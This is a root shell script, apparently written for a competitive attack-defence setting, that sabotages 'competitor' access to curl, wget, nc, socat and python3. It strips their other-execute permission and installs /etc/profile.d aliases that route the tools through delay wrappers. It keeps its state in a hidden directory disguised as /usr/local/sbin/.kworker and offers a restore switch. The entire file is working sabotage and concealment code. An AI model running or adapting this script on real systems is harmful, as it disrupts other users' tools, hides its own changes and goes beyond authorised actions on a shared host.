#!/bin/sh
# DESC: reversible degradation of competitor tooling (other-bit + slow aliases)
# REQ: root for profile.d, chmod

P="${BW_PREFIX:-blk_}"
D="${BW_PREFIX_DIR:-/usr/local/sbin/.kworker}"
DRY="${BW_DRY_RUN:-0}"
TOOLS="${BW_TROLL_TOOLS:-curl wget nc socat python3}"
MANIFEST="$D/${P}troll_modes"

say() { printf '[TROLL] %s\n' "$1"; }
run() {
    if [ "$DRY" = "1" ]; then
        printf '[dry] %s\n' "$*"
    else
        "$@"
    fi
}

mkdir -p "$D" 2>/dev/null || true

if [ "${BW_TROLL_RESTORE:-0}" = "1" ]; then
    say "restoring tooling"
    if [ -f "$MANIFEST" ]; then
        while IFS=' ' read -r path mode; do
            [ -n "$path" ] && [ -n "$mode" ] || continue
            run chmod "$mode" "$path" 2>/dev/null || true
            say "restored $path ($mode)"
        done < "$MANIFEST"
        run rm -f "$MANIFEST"
    fi
    for tool in $TOOLS; do
        run rm -f "/etc/profile.d/${P}t_${tool}" "$D/${P}t_${tool}"
    done
    say "done"
    exit 0
fi

say "degrading: $TOOLS"
for tool in $TOOLS; do
    real="$(command -v "$tool" 2>/dev/null || true)"
    [ -n "$real" ] && [ -f "$real" ] || continue
    mode="$(stat -c '%a' "$real" 2>/dev/null || echo 755)"
    if [ "$DRY" = "1" ]; then
        printf '[dry] save mode %s %s\n' "$real" "$mode"
    else
        [ -f "$MANIFEST" ] || { touch "$MANIFEST" 2>/dev/null; chmod 600 "$MANIFEST" 2>/dev/null; }
        grep -qF "$real " "$MANIFEST" 2>/dev/null || printf '%s %s\n' "$real" "$mode" >> "$MANIFEST"
    fi
    run chmod o-x "$real" 2>/dev/null || true
    say "chmod o-x $real (was $mode)"

    if [ -d /etc/profile.d ]; then
        if [ "$DRY" = "1" ]; then
            printf '[dry] alias %s -> slow wrapper\n' "$tool"
        else
            cat > "$D/${P}t_${tool}" << EOF_WRAP
#!/bin/sh
sleep 0.3
exec "$real" "\$@"
EOF_WRAP
            chmod 755 "$D/${P}t_${tool}" 2>/dev/null || true
            printf "alias %s='%s/${P}t_%s'\n" "$tool" "$D" "$tool" > "/etc/profile.d/${P}t_${tool}"
            chmod 644 "/etc/profile.d/${P}t_${tool}" 2>/dev/null || true
        fi
        say "alias: $tool slowed for interactive shells"
    fi
done

say "restore with BW_TROLL_RESTORE=1"
